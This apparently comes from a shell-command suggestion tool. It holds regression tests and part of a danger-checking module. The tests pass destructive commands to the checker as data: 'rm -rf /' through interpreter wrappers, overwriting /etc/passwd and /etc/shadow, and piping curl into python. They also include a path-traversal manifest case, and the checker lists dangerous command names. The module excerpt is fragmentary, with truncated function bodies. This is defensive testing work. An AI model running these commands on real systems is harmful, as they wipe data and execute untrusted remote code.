+  for (const c of [`python3 - <<< "import os; os.system('rm -rf /')"`, "bash <<< 'rm -rf /'", `sh -c 'rm -rf "$1"' _ /`,
+    `bash -c 'rm -rf $1' x /etc`, 'truncate -s0 /etc/passwd', '> /etc/passwd', 'echo x > /etc/shadow', ': > /boot/grub/grub.cfg']) {
+    const d = checkDanger(c);
+    assert.equal(d.risk, 'high', c);
+    assert.ok(d.critical, `${c}: ${d.warnings.join('; ')}`);
+  }
+  for (const c of ['python3 <<EOF\nprint(1)\nEOF', 'perl - <<< "print 1"', 'curl -s https://x.example/a.py | python3', 'echo x >> /etc/hosts', 'truncate -s0 app.log']) {
+    const d = checkDanger(c);
+    assert.equal(d.risk, 'high', c);
+    assert.ok(!d.critical, `${c}: ${d.warnings.join('; ')}`);
+  }
+  // `python3 -m` imports from the working directory first: medium (v0.3 close4)
+  assert.equal(checkDanger('cat a.json | python3 -m json.tool').risk, 'medium');
+  for (const c of ['grep x <<< "rm -rf /"', 'echo hi 2>/dev/null']) assert.equal(checkDanger(c).risk, 'safe', c);
+});
+
+test('minor: a NUL byte never reaches spawnSync', () => {
+  for (const q of ['change permissions recursively to 777 on "/tmp/a\0b"', 'list files sorted by size in "/tmp/a\0b"', 'delete it\0']) {
+    const r = suggest(q, { env: BASH });
+    assert.equal(r.understood, false, q);
+    assert.equal(r.command, null);
+  }
+  assert.equal(validateComposed('ls /tmp/a\0b', 'ls').ok, false);
+});

+// Regression tests for round 8: the round-7 findings (review/r7-claude.md, review/r7-codex.md). Quoted request text
+// passed as several arguments is not a path; the running tellsh call is dropped only on an exact match; several
+// operands are not "it"/"them"; deleting, editing or overwriting system files is critical; a cd after a file read;
+// "move it there" is refused; the composer never fills a withheld slot; the encoder bundle installer only writes its
+// own files; augmented hybrid training rows are filtered against the held-out sets; the hybrid re-ranks the policy's
+// k candidates whatever --top shows; npm scoped packages.
+import { test } from 'node:test';
+import assert from 'node:assert/strict';
+import { spawnSync } from 'node:child_process';
+import { mkdtempSync, mkdirSync, writeFileSync, readdirSync, existsSync, rmSync } from 'node:fs';
+import { createHash } from 'node:crypto';
+import { tmpdir } from 'node:os';
+import { join } from 'node:path';
+import { fileURLToPath } from 'node:url';
+import { suggest } from '../src/pipeline.js';
+import { checkDanger } from '../src/danger.js';
+import { joinArgs, joinWords } from '../src/shellwords.js';
+import { tellshArgs, analyzeCommand } from '../src/history.js';
+import { suggestHybrid } from '../src/rerank/hybrid.js';
+import { cascade } from '../src/cascade.js';
+import { envFeatures } from '../src/env.js';
+import { heldOutFilter } from '../scripts/hybrid/export_data.js';
+import { exclusionIndex } from '../scripts/lib/heldout.js';
+
+const BASH = { shell: 'bash', os: 'linux', coreutils: 'gnu' };
+const run = (q, history, o = {}) => suggest(q, { env: BASH, ...(history ? { history } : {}), ...o });
+const ROOT = fileURLToPath(new URL('..', import.meta.url));
+const BIN = join(ROOT, 'bin', 'tellsh.js');
+const cli = (args) => spawnSync(process.execPath, [BIN, ...args], { encoding: 'utf8', env: { ...process.env, NO_COLOR: '1' } });
+const cliJson = (...words) => JSON.parse(cli(['--json', '--shell', 'bash', '--os', 'linux', ...words]).stdout);
+
+test('major: request text passed as several quoted arguments is never the path', () => {
+  assert.deepEqual(joinArgs(['delete folder', '/tmp/x']), { text: 'delete folder /tmp/x', unclear: [] });
+  assert.deepEqual(joinArgs(['usuń katalog', 'build']), { text: 'usuń katalog build', unclear: [] });
+  assert.deepEqual(joinArgs(['delete', 'folder', 'my data']), { text: 'delete folder "my data"', unclear: ['my data'] });
+  assert.equal(joinWords(['delete', 'My Notes.txt']), 'delete "My Notes.txt"');
+  assert.equal(joinWords(['delete', 'folder', '/tmp/a b']), 'delete folder "/tmp/a b"');
+  assert.equal(cliJson('--dry-run', 'delete folder', '/tmp/x').command, 'rm -r /tmp/x');
+  assert.equal(cliJson('delete the folder', '/tmp/my data').command, "rm -r '/tmp/my data'");
+  assert.equal(cliJson('usuń katalog', 'build').command, 'rm -r build');
+  // the .log filter is kept
+  assert.equal(cliJson('delete all log files in', '/tmp/my logs').command, "find '/tmp/my logs' -type f -iname '*.log' -delete");
+  // a quoted argument that may be a name or words of the request: placeholder for a changing command
+  const u = cliJson('delete', 'folder', 'my data');
+  assert.equal(u.command, 'rm -r <PATH>');
+  assert.ok(u.warnings.some((w) => /quoted argument/.test(w)), u.warnings);
+  // still one value where a quoted text is expected
+  assert.equal(cliJson('grep', 'for', 'hello world', 'in', 'src').command, "grep -rn -- 'hello world' src");
+  // the same reading for `tellsh …` lines in history
+  assert.deepEqual(tellshArgs('tellsh "delete folder" /tmp/x'), { text: 'delete folder /tmp/x', unclear: [] });
+  assert.ok(!/delete folder/.test(run('delete it', ['tellsh "delete folder" /tmp/x']).command));
+  const h = run('show it', ['tellsh delete folder "my data"']);
+  assert.ok(!/my data|'my'/.test(h.command ?? ''), h.command);
+});
+
+test('the running tellsh call is dropped only when its request is exactly the query', () => {
+  for (const h of [['cat secret.txt', 'tellsh show it delete it'], ['cat /tmp/important.txt', 'tellsh --dry-run "delete it from /tmp/scratch"']]) {
+    const r = run('delete it', h);
+    assert.ok(!/secret|important/.test(r.command ?? ''), `${JSON.stringify(h)} -> ${r.command}`);
+  }
+  assert.equal(run('delete it', ['cat a.txt', 'tellsh --history delete it']).command, 'rm a.txt');
+  assert.equal(run('delete it', ['cat a.txt', 'tellsh --history "delete  it"']).command, 'rm a.txt');
+});
+
+test('several operands: "them" / "it" leave a placeholder instead of the last one', () => {
+  for (const h of ['touch a.txt b.txt', 'rm -i a.txt b.txt', 'cat a.txt b.txt', 'mkdir /tmp/a /tmp/b']) {
+    for (const q of ['delete them', 'delete it']) {
+      const r = run(q, [h]);
+      assert.equal(r.context.rule, 'refused', `${q} after ${h}: ${r.command}`);
+      assert.ok(!/b\.txt|\/tmp\/b/.test(r.command ?? ''), `${q} after ${h}: ${r.command}`);
+    }
+  }
+  // one operand (counts, chmod modes and owners are not operands; a script and its arguments are several: regressions10)
+  assert.equal(run('delete it', ['head -n 5 a.txt']).command, 'rm a.txt');
+  assert.equal(run('delete it', ['chmod 644 a.txt']).command, 'rm a.txt');
+  assert.equal(run('delete it', ['chown me:me a.txt']).command, 'rm a.txt');
+  assert.equal(analyzeCommand('python3 run.py --fast').ents.file, 'run.py');
+});
+
+test('deleting, editing in place or overwriting a system file is critical', () => {
+  for (const c of ['rm /etc/passwd', 'rm -f /etc/shadow', 'sudo rm -- /boot/vmlinuz', 'unlink /etc/hosts', 'sed -i d /etc/passwd',
+    "sed -i.bak -e 's/a/b/' /etc/fstab", 'tee /etc/passwd < /dev/null', 'cat /dev/null | sudo tee /etc/passwd', 'echo x | tee /usr/bin/ls']) {
+    const d = checkDanger(c, 'high');
+    assert.equal(d.critical, true, `${c}: ${JSON.stringify(d)}`);
+  }
+  for (const c of ['rm a.txt', 'sed -i d notes.txt', 'tee out.txt', 'echo x | sudo tee -a /etc/hosts', "sed 's/a/b/' /etc/passwd", 'cat /etc/passwd']) {
+    assert.equal(checkDanger(c, 'safe').critical, false, c);
+  }
+  // reachable from a generated suggestion
+  const r = run('delete it', ['sudo cat /etc/shadow']);
+  assert.equal(r.command, 'rm /etc/shadow');
+  assert.equal(r.critical, true);
+});
+
+test('a cd after a file read: "it" is refused, not the cd target', () => {
+  const r = run('delete it', ['cat a.txt; cd /srv']);
+  assert.equal(r.context.rule, 'refused');
+  assert.ok(!/\/srv|a\.txt/.test(r.command ?? ''), r.command);
+  // reading is fine: the directory is the newest value of the line
+  assert.equal(run('show it', ['cat a.txt; cd /srv']).command, 'ls -lah /srv');
+});
+
+test('"move it there" is refused with a note, never reported as a resolved pronoun', () => {
+  for (const h of [['cd /tmp/x'], ['cd /tmp/x; cat a.txt'], ['cat a.txt']]) {
+    const r = run('move it there', h);
+    assert.equal(r.context.rule, 'refused', JSON.stringify(h));
+    assert.match(r.context.note, /"it".*"there"|it.*there/);
+    assert.ok(r.command == null || /<SRC>|<DST>|<PATH>/.test(r.command), r.command);
+  }
+});
+
+test('the composer never fills a slot the catalog withheld', () => {
+  for (const q of ['change permissions recursively to 777 on `pwd`', 'change permissions recursively to 777 on $(pwd)',
+    'change permissions recursively to 777 on "/tmp/a\nb"']) {
+    const r = run(q);
+    assert.notEqual(r.method, 'composed', `${q} -> ${r.command}`);
+    assert.ok(!/-- pwd|\n/.test(r.command ?? ''), `${q} -> ${r.command}`);
+    assert.ok(r.command == null || r.missing.length > 0, `${q} -> ${r.command}`);
+  }
+  for (const q of ['chmod -R 755 on `pwd`', 'chmod -R 755 on $(pwd)']) {
+    for (const compose of ['auto', 'force']) {
+      const r = run(q, null, { compose });
+      assert.ok(!/(?:^|\s)(?:--\s+)?pwd(?:\s|$)/.test(r.command ?? ''), `${q} (${compose}) -> ${r.command}`);
+    }
+  }
+  // an ordinary path still composes
+  assert.equal(run('change permissions recursively to 777 on /tmp/ab').command, 'chmod -R 777 -- /tmp/ab');
+});
+
+test('fetch_model installs only the bundle files named in the manifest', () => {
+  const dir = mkdtempSync(join(tmpdir(), 'tellsh-r8-'));
+  const sha = (b) => createHash('sha256').update(b).digest('hex');
+  const FILES = ['encoder.int8.onnx', 'vocab.json', 'labels.json'];
+  const fetch = (from, to) => spawnSync(process.execPath, [join(ROOT, 'scripts/hybrid/fetch_model.js'), '--from', from, '--to', to], { encoding: 'utf8' });
+  try {
+    const src = join(dir, 'src', 'bundle');
+    mkdirSync(src, { recursive: true });
+    for (const f of FILES) writeFileSync(join(src, f), f);
+    writeFileSync(join(dir, 'src', 'evil'), 'payload');
+    const files = Object.fromEntries(FILES.map((f) => [f, sha(Buffer.from(f))]));
+    // a name that escapes the destination, an absolute path, an extra name
+    for (const extra of [{ '../evil': sha(Buffer.from('payload')) }, { [join(dir, 'abs')]: sha(Buffer.from('payload')) }, { 'other.bin': sha(Buffer.from('x')) }]) {
+      writeFileSync(join(src, 'manifest.json'), JSON.stringify({ bundle: 'enc-v2', files: { ...files, ...extra } }));
+      const to = join(dir, 'out', 'enc');
+      const r = fetch(src, to);
+      assert.notEqual(r.status, 0, r.stdout);
+      assert.match(r.stderr, /must list exactly/);
+      assert.ok(!existsSync(to), 'nothing is written');
+      assert.ok(!existsSync(join(dir, 'out', 'evil')) && !existsSync(join(dir, 'abs')));
+    }
+    // a missing name, or a bad checksum: nothing is written either
+    writeFileSync(join(src, 'manifest.json'), JSON.stringify({ bundle: 'enc-v2', files: { ...files, 'vocab.json': sha(Buffer.from('other')) } }));
+    assert.notEqual(fetch(src, join(dir, 'out2')).status, 0);
+    assert.ok(!existsSync(join(dir, 'out2')));
+    // the real thing
+    writeFileSync(join(src, 'manifest.json'), JSON.stringify({ bundle: 'enc-v2', files }));
+    const ok = fetch(src, join(dir, 'ok'));
+    assert.equal(ok.status, 0, ok.stderr);
+    assert.deepEqual(readdirSync(join(dir, 'ok')).sort(), [...FILES, 'manifest.json'].sort());
+  } finally { rmSync(dir, { recursive: true, force: true }); }
+});
+

// Regression tests for the v0.3 final3 review (review/final3-claude.md, review/final3-codex.md) and the rules that replace
// further parser patches:
//  (1) paths: an unquoted path or name followed by more words of its name (`~/Old Projects`) is taken to the end of its
//      span; when that end is unclear (`/tmp/a.txt b.txt`) the path is a placeholder. Never the first word alone.
//  (2) prompt: a medium-risk command never runs on a plain Enter (it needs "y"); a high-risk one needs "yes".
//  (3) tools that run project code (pytest, npm/yarn/pnpm run, make, cargo, go test/run, python/node scripts, npx,
//      wrangler) are at least medium, also for --help / --version.
//  (4) scope options (--workspace, --repo / "in project X", --env, --config, --prefix) are kept or placeholdered, never
//      dropped.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { suggest, pathTail } from '../src/pipeline.js';
import { assessCommand, checkDanger } from '../src/danger.js';
import { scopeMentions } from '../src/fill.js';
import { confirmRule } from '../src/cli.js';

const BASH = { shell: 'bash', os: 'linux', coreutils: 'gnu' };
const SHELLS = [BASH, { shell: 'zsh', os: 'darwin', coreutils: 'bsd' }, { shell: 'fish', os: 'linux', coreutils: 'gnu' },
  { shell: 'powershell', os: 'win32', coreutils: 'gnu' }, { shell: 'cmd', os: 'win32', coreutils: 'gnu' }];
const run = (q, env = BASH) => suggest(q, { env });

// ---------- (1) paths ----------
test('final3-claude major: an unquoted path with spaces is never cut at its first space', () => {
  const whole = {
    'delete the folder ~/Old Projects': "rm -r ~/'Old Projects'",
    'delete folder /tmp/my data': "rm -r '/tmp/my data'",
    'delete all .log files in /var/log old': "find '/var/log old' -type f -iname '*.log' -delete",
    'chmod 777 /srv/my app': "chmod 777 '/srv/my app'",
    'move /tmp/old notes to /tmp/archive': "mv -i '/tmp/old notes' /tmp/archive",
    // the same for a bare name and for Polish
    'delete the folder Old Projects': "rm -r 'Old Projects'",
    'usuń folder ~/Stare Projekty': "rm -r ~/'Stare Projekty'",
    // a modifier or a connector ends the name
    'delete the folder ~/Old Projects please': "rm -r ~/'Old Projects'",
    'delete the folder ~/Old Projects recursively': "rm -r ~/'Old Projects'",
    'copy ~/My Notes to /tmp/backup': "cp -ri ~/'My Notes' /tmp/backup",
  };
  for (const [q, cmd] of Object.entries(whole)) {
    const r = run(q);
    assert.equal(r.command, cmd, q);
    assert.deepEqual(r.missing, [], q);
  }
});

test('final3-claude major: a path whose end is unclear is a placeholder with a warning', () => {
  for (const [q, cmd, k] of [
    ['delete file /tmp/a.txt b.txt', 'rm <FILE>', 'file'],
    ['delete file /tmp/my notes.txt', 'rm <FILE>', 'file'],
    ['copy /tmp/my notes /tmp/b', 'cp -ri <SRC> /tmp/b', 'src'],
  ]) {
    const r = run(q);
    assert.equal(r.command, cmd, q);
    assert.ok(r.missing.includes(k), q);
    assert.ok(r.warnings.some((w) => /unclear where the unquoted name ends/.test(w)), `${q}: ${r.warnings.join('; ')}`);
  }
  // ends in sentence punctuation: the existing placeholder (the name may include the `.`)
  const p = run('delete the folder ~/Old Projects.');
  assert.equal(p.command, 'rm -r <PATH>');
});

test('paths: words of the request after a path are not part of its name', () => {
  for (const [q, cmd] of [
    ['make script.sh executable', 'chmod +x script.sh'],
    ['delete file /tmp/notes.txt now', 'rm /tmp/notes.txt'],
    ['delete file /tmp/notes.txt permanently', 'rm /tmp/notes.txt'],
    ['copy /tmp/a /tmp/b', 'cp -ri /tmp/a /tmp/b'],
    ['copy /tmp/a.txt /tmp/b', 'cp -ri /tmp/a.txt /tmp/b'],
    ['list files in ~/Old Projects', "ls -lah ~/'Old Projects'"],
    ['which directory inside node_modules is the largest? show 15', 'du -h -d 1 node_modules 2>/dev/null | sort -rh | head -n 15'],
    ['ile jest plików w /etc razem z podkatalogami', 'find /etc -type f | wc -l'],
    ['utwórz archiwum tar.gz z /etc o nazwie etc.tgz', 'tar -czvf etc.tgz /etc'],
  ]) assert.equal(run(q).command, cmd, q);
  // a withheld path keeps its placeholder in an optional part of the template (never `git restore` of everything)
  assert.equal(pathTail('rm /tmp/a.txt b.txt', '/tmp/a.txt', [], { used: ['b.txt'] }), null);
  assert.deepEqual(pathTail('rm /tmp/a.txt b.txt', '/tmp/a.txt', []), { ambiguous: true, words: ['b.txt'] });
});

test('paths: the composer takes the whole name too, never its first word', () => {
  const r = run('recursively chmod 777 /srv/my app');
  assert.ok(r.command.endsWith("'/srv/my app'"), r.command);
  assert.ok(!/(?:^|\s)\/srv\/my(?:\s|$)/.test(r.command), r.command);
  // a read-only composed command is not blocked by words of the request after its path
  assert.equal(run('find files in /tmp owned by user bob').command, 'find /tmp -type f -user bob');
});

test('paths: the one-argument and the several-argument forms agree', () => {
  // `tellsh delete the folder "~/Old Projects"` is quoted again by joinArgs
  assert.equal(run('delete the folder ~/Old Projects').command, run("delete the folder '~/Old Projects'").command);
});

// ---------- (2) prompt ----------
test('final3-claude major: a medium-risk command never runs on a plain Enter', () => {
  const med = confirmRule('medium');
  for (const a of ['', ' ', 'n', 'no', 'x']) assert.equal(med.accepts(a), false, JSON.stringify(a));
  for (const a of ['y', 'Y', 'yes', 't', 'tak']) assert.equal(med.accepts(a), true, a);
  assert.match(med.prompt, /Type y to run/);
  const high = confirmRule('high');
  for (const a of ['', 'y', 't']) assert.equal(high.accepts(a), false, JSON.stringify(a));
  for (const a of ['yes', 'YES', 'tak']) assert.equal(high.accepts(a), true, a);
  // composed (experimental) is like high; an unknown rating too
  assert.equal(confirmRule('medium', { composed: true }).accepts('y'), false);
  assert.equal(confirmRule(undefined).accepts(''), false);
  // safe: Enter runs
  for (const a of ['', 'y', 'yes']) assert.equal(confirmRule('safe').accepts(a), true, JSON.stringify(a));
  // incomplete: never runs as is
  for (const r of ['safe', 'medium', 'high']) assert.equal(confirmRule(r, { incomplete: true }).accepts('yes'), false, r);
  // the reviewed medium rows need "y"
  for (const q of ['chmod 777 /srv/my app', 'move /tmp/old notes to /tmp/archive']) assert.equal(run(q).risk, 'medium', q);
});

// ---------- (3) project code ----------
test('final3-codex major: tools that run project code are at least medium, also for --help', () => {
  for (const env of SHELLS) {
    const r = run('show the help for pytest', env);
    assert.equal(r.risk, 'medium', `${env.shell}: ${r.command}`);
    assert.ok(r.warnings.some((w) => /runs code from the project/.test(w)), env.shell);
  }
  for (const c of ['pytest --help', 'pytest --version', 'py.test --help', 'make --help', 'make', 'cargo --version', 'cargo test',
    'go test ./...', 'go run .', 'go generate', 'python3 script.py', 'python -m mypkg', 'node app.js', 'node server.js --help',
    'npx eslint --help', 'npm run build', 'npm run --help', 'npm test', 'yarn dev', 'yarn --version', 'pnpm run build',
    'wrangler --version', 'wrangler dev', 'npx wrangler deploy', 'bun run dev', 'tox --help', 'poetry run pytest', 'uv run x.py', 'bundle exec rake']) {
    assert.notEqual(assessCommand(c).risk, 'safe', c);
    assert.notEqual(checkDanger(c, 'safe', { rendered: true }).risk, 'safe', c);
  }
  // the tool's own --help / --version, without project code: unchanged
  for (const c of ['node --version', 'python3 --version', 'npm --version', 'npm --help', 'pnpm --help', 'go version', 'go help', 'git --help']) {
    assert.equal(checkDanger(c, 'safe', { rendered: true }).risk, 'safe', c);
  }
  for (const q of ['pokaz wersje cargo', 'help for make']) assert.equal(run(q).risk, 'medium', q);
  // a medium intent gets no extra warning (it is medium already)
  assert.ok(!run('run npm deploy').warnings.some((w) => /runs code from the project/.test(w)));
});

// ---------- (4) scope options ----------
test('final3-codex major: an npm workspace is kept, never dropped', () => {
  for (const env of SHELLS) {
    const r = run('run npm deploy --workspace staging', env);
    assert.match(r.command, /^npm run '?deploy'? --workspace staging$/, `${env.shell}: ${r.command}`);
  }
  for (const [q, cmd] of [
    ['run npm deploy -w staging', 'npm run deploy --workspace staging'],
    ['run npm deploy --workspace=staging', 'npm run deploy --workspace staging'],
    ['run the build script in workspace api', 'npm run build --workspace api'],
    ['install express in workspace api', 'npm install express --workspace api'],
  ]) assert.equal(run(q).command, cmd, q);
  // two workspaces: neither is guessed
  const two = run('run npm deploy --workspace a --workspace b');
  assert.equal(two.command, 'npm run deploy --workspace <WORKSPACE>');
  assert.ok(two.missing.includes('workspace'));
  // a workspace that is not a readable name
  assert.ok(run('run npm deploy --workspace ../x').missing.includes('workspace'));
});

test('final3-codex major: a scope npm cannot express is a placeholder, never dropped', () => {
  for (const [q, cmd] of [
    ['run npm deploy --env prod', 'npm run deploy <SCOPE>'],
    ['run npm test in project api', 'npm run test <SCOPE>'],
    ['run tests with npm --prefix api', 'npm run test <SCOPE>'],
    ['run npm build --config x.json', 'npm run build <SCOPE>'],
  ]) {
    const r = run(q);
    assert.equal(r.command, cmd, q);
    assert.ok(r.missing.includes('scope'), q);
  }
});

test('final3-codex major: an explicit pull request does not hide an unresolved repository', () => {
  for (const env of SHELLS) assert.equal(run('merge pr 42 in project acme/backend', env).command, 'gh pr merge 42 --repo acme/backend', env.shell);
  for (const [q, cmd] of [
    ['merge pr 42 in project backend', 'gh pr merge 42 --repo <REPO>'],
    ['view pr 42 in project acme/backend', 'gh pr view 42 --repo acme/backend'],
    ['list prs in project acme/backend', 'gh pr list --repo acme/backend'],
    ['merge pr 42 in acme/backend', 'gh pr merge 42 --repo acme/backend'],
    ['merge pr 42 --repo acme/backend', 'gh pr merge 42 --repo acme/backend'],
    // gh has no environment: placeholder
    ['merge pr 42 --env prod', 'gh pr merge 42 <SCOPE>'],
  ]) assert.equal(run(q).command, cmd, q);
  // a wrangler config file is not dropped either
  assert.ok(run('deploy worker --config other.toml').missing.length > 0);
});

test('scope mentions: short options belong to one tool', () => {
  assert.deepEqual(scopeMentions('npm_run_script', 'run build -w api').map((s) => s.kind), ['workspace']);
  assert.deepEqual(scopeMentions('gh_pr_merge', 'merge pr -w api'), []);
  assert.deepEqual(scopeMentions('gh_pr_merge', 'merge pr 4 -R a/b').map((s) => [s.kind, s.value]), [['repo', 'a/b']]);
  // "in this project" is the working directory's
  assert.deepEqual(scopeMentions('npm_run_script', 'run build in this project'), []);
});

test('a contested npm script is a placeholder, never the literal marker', () => {
  const r = run('run npm build or test');
  assert.equal(r.command, 'npm run <SCRIPT>');
  assert.ok(!/'\?'/.test(r.command));
});

// Dangerous-pattern checker. Runs on every final command (including user-edited ones)
// and can only ever escalate risk, never lower it. Whether a command can be safe at all is the
// trust rule at the end of this file (checkDanger): only tellsh's own catalog renders with plain values.
//
// Regex rules run on the command text after `git`/`docker` global options are removed
// (`git -C /repo -c x=y reset --hard` is checked as `git reset --hard`). Structural rules
// (rm, kill, Remove-Item, rd/del) tokenize each simple command so long options, quoted targets
// and `--` are understood.

import { ALLOW } from './allowlist-data.js';

const RANK = { safe: 0, medium: 1, high: 2 };
export const maxRisk = (a, b) => (RANK[b] > RANK[a] ? b : a);

// ---------------------------------------------------------------------------------------------
// light tokenizer: simple commands separated by ; & | && || ( ) and newlines, words unquoted
// (POSIX '…' "…" \x and PowerShell `x). Good enough for danger checks, not a full shell parser.

// PowerShell also treats the typographic quotes as quote characters (about_Quoting_Rules)
const PS_SQ = /['\u2018\u2019\u201A\u201B]/;
const PS_DQ = /["\u201C\u201D\u201E]/;

// $'…' (bash, zsh, ksh): the index of its closing quote (`\'` does not close it)
const ansiEnd = (s, i) => { let j = i + 2; while (j < s.length && s[j] !== "'") j += s[j] === '\\' ? 2 : 1; return Math.min(j, s.length); };
const ANSI_ESC = { n: '\n', t: '\t', r: '\r', a: '\x07', b: '\b', e: '\x1b', E: '\x1b', f: '\f', v: '\v' };

// winPaths: backslash is never an escape (cmd.exe / PowerShell paths such as "C:\"), and the
// PowerShell typographic quotes ‘…’ “…” quote like ' and "
export function simpleCommands(cmd, { winPaths = false } = {}) {

  let w = null;
  const flushWord = () => { if (w != null) { words.push(w); w = null; } };
  const flushCmd = () => { flushWord(); if (words.length) out.push(words); words = []; };

  const isSq = (c) => (winPaths ? PS_SQ.test(c) : c === "'");
  const isDq = (c) => (winPaths ? PS_DQ.test(c) : c === '"');

// strip wrappers that run their argument as the command (sudo, timeout N, chroot DIR, env A=b, ...)
// options of each wrapper that take a separate value
const WRAPPER_OPTARG = {

  doas: /^-[uC]$/,
  nice: /^-n$|^--adjustment$/,
  ionice: /^-[cnpPu]$|^--(?:class|classdata|pid|pgid|uid)$/,
  xargs: /^-[IdEnLPsa]$|^--(?:arg-file|delimiter|max-args|max-procs|max-chars|replace|eof)$/,
  timeout: /^-[sk]$|^--(?:signal|kill-after)$/,
  chroot: /^--(?:userspec|groups)$/,
  stdbuf: /^-[ioe]$|^--(?:input|output|error)$/,
  env: /^-[uCS]$|^--(?:unset|chdir|split-string)$/,
  time: /^-[fo]$|^--(?:format|output)$/,
  exec: /^-a$/,
  unshare: /^-[SGRwl]$|^--(?:setuid|setgid|root|wd|map-user|map-group|propagation|setgroups)$/,
  watch: /^-[nq]$|^--(?:interval|equexit)$/,
  nsenter: /^-[tSGrw]$|^--(?:target|setuid|setgid|root|wd)$/,
  setpriv: /^--(?:reuid|regid|groups|inh-caps|ambient-caps|bounding-set|securebits|pdeathsig|selinux-label|apparmor-profile)$/,
  strace: /^-[eoopsuPIEXbS]$/,
  ltrace: /^-[eoopsuPnS]$/,
  flock: /^-[wEc]$|^--(?:timeout|wait|conflict-exit-code|command)$/,
  taskset: /^-[c]$/,
  'systemd-run': /^-[upEH]$|^--(?:unit|property|setenv|host|machine|description|slice|uid|gid|working-directory|on-calendar|on-active)$/,
  runuser: /^-[ugl]$|^--(?:user|group|login)$/,
  pkexec: /^--user$/,
  run0: /^-[ugD]$|^--(?:user|group|chdir|unit|property|description|slice|nice|setenv|background|machine|shell-prompt-prefix|area)$/,
  chrt: /^-[TPD]$|^--(?:sched-runtime|sched-period|sched-deadline)$/,
  cgexec: /^-g$/,
  torsocks: /^-[uapP]$|^--(?:user|pass|address|port)$/,

// Command strings given as an option value are checked as commands of their own. Any program:
// `-c STR`, `--command STR`, `--command=STR` (`flock -c "rm -rf /" LOCK`, `script -c "…"`, `find … -exec sh -c "…"`);
// shells, su and runuser also take -c inside a cluster (`bash -lc "…"`, `su -lc "…"`); env -S splits its string.
const CMD_STRING_ANY = /^(?:-c|--command|--session-command)$/;
const CMD_STRING_CLUSTER = /^-[a-zA-Z]*c$/;
const SHELLS = /^(?:ba|z|da|k|fi|c|tc|a|mk|r)?sh$|^busybox$/;
const PRIVILEGED = new Set(['sudo', 'doas', 'su', 'runuser', 'pkexec', 'run0', 'sudoedit']);

const RUNNERS = new Set(['su', 'runuser', 'flock', 'script', 'eval', 'env', 'watch', 'tmux', 'screen', 'ssh', 'xargs', 'parallel', 'sudo', 'doas',
  'pkexec', 'run0', 'nohup', 'setsid', 'timeout', 'iex', 'invoke-expression', 'cmd', 'pwsh', 'powershell', 'start-process', 'sem']);
const WRAPPERS = new Set(['sudo', 'doas', 'run0', 'command', 'builtin', 'exec', 'nohup', 'time', 'nice', 'ionice', 'then', 'do', 'else', '&', 'busybox', 'toybox', 'xargs', 'timeout', 'chroot', 'stdbuf', 'env', 'setsid', 'unbuffer', 'caffeinate',
  'unshare', 'watch', 'nsenter', 'setpriv', 'strace', 'ltrace', 'flock', 'taskset', 'systemd-run', 'runuser', 'firejail', 'proot', 'fakeroot',
  'pkexec', 'chrt', 'cgexec', 'eatmydata', 'torsocks', 'catchsegv', 'proxychains', 'proxychains4', 'tsocks', 'valgrind', 'faketime', 'ts',
  'chronic', 'nocache', 'trickle', 'numactl', 'schedtool', 'cpulimit', 'prlimit', 'sg', 'newgrp', 'su', 'parallel', 'sem', 'tmux', 'screen',
  'script', 'xvfb-run', 'dbus-launch', 'dbus-run-session', 'expect', 'gdb', 'ssh-agent', 'sshpass', 'with-lock-ex', 'lckdo', 'daemonize', 'start-stop-daemon']);

const SUFFIX_RUNNERS = new Set(['ssh', 'mosh', 'kubectl', 'docker', 'podman', 'lxc', 'incus', 'machinectl', 'distrobox', 'toolbox', 'flatpak', 'nix-shell', 'firejail', 'bwrap']);

// programs whose arguments are data, never a command they run (`grep -r rm src`, `man rm`, `echo rm -rf /`)
const DATA_ARGS = new Set(['grep', 'egrep', 'fgrep', 'rg', 'ag', 'ack', 'sed', 'awk', 'gawk', 'mawk', 'echo', 'printf', 'man', 'which', 'whereis',

  'history', 'fc', 'complete', 'compgen', 'hash', 'test', '[', '[[', 'true', 'false', 'printenv', 'set', 'unset', 'export', 'declare', 'local',
  'readonly', 'trap', 'write-host', 'write-output', 'get-help', 'get-command', 'select-string', 'sls', 'findstr', 'wc', 'sort', 'uniq', 'cut',
  'tr', 'diff', 'cmp', 'file', 'stat', 'du', 'df', 'tree', 'jq', 'yq', 'xxd', 'od', 'hexdump', 'strings', 'mkdir', 'touch', 'cd', 'pushd']);

const DANGER_HEADS = /^(?:rm|rmdir|unlink|shred|wipe|wipefs|mkfs(?:\.\w+)?|mke2fs|dd|truncate|kill|pkill|killall|chmod|chown|chgrp|mv|cp|rsync|find|tar|tee|sh|bash|zsh|dash|ksh|fish|eval|shutdown|reboot|halt|poweroff|crontab|iptables|remove-item|ri|del|erase|rd|format|diskpart|stop-process|format-volume|clear-disk)$/i;

/** Collect `-c STR` style payloads of one simple command into `inner` (`unsure` when a runner's payload cannot be read). */
function payloads(w, inner, flags) {

  // must be readable; `-c` of any other program (`grep -c "$PAT"`) is still checked, without that requirement
  const add = (v, i) => {
    if (v == null) return;

      continue;

      if (SHELLS.test(h) && w[i + 1] != null && w.length > i + 2) inner.push(withPositional(String(w[i + 1]), w.slice(i + 2).map(String)));

const sq = (x) => `'${x.replace(/'/g, "'\\''")}'`;
/** `sh -c STR arg0 args…`: STR with $0…$9, ${N}, "$@", $@ and $* replaced by the (quoted) arguments. */
function withPositional(str, args) {

/** The command a wrapper chain runs. `inner` collects command strings given as option values (`su -c "…"`). */
export function commandWords(words, inner = [], flags = {}) {

  for (;;) {
    while (w.length && /^\w+=/.test(w[0])) w = w.slice(1);
    const h = (w[0] || '').replace(/^.*[\\/]/, '').toLowerCase();
    payloads(w, inner, flags);
    if (!WRAPPERS.has(h)) return w;
    w = w.slice(1);
    const optArg = WRAPPER_OPTARG[h];

    if (h === 'chroot' && w.length) w = w.slice(1); // NEWROOT

/**

 * options are not always understood (`sudo -iu root rm …`, `nice --adjustment=5 rm …`), the command starting
 * at every later non-option word of a wrapper / remote runner (`ssh host rm -rf /`, `docker exec ct rm …`).
 * The checks only ever escalate, so reading too many candidates is safe; missing one is not.
 */
export function commandChains(words, inner, flags) {
  const out = [];
  const push = (w) => { if (w.length && !out.some((o) => o.length === w.length && o.every((x, i) => x === w[i]))) out.push(w); };
  push(commandWords(words, inner, flags));

  }

    for (let j = lead + 1; j < words.length; j++) {

      const w = commandWords(words.slice(j), inner, flags);
      push(w);
      // a lone quoted string with spaces is a command (`tmux new "rm -rf /"`, `ssh host "rm -rf /"`)
      if (w.length === 1 && /\s/.test(w[0])) inner.push(w[0]);
    }

}

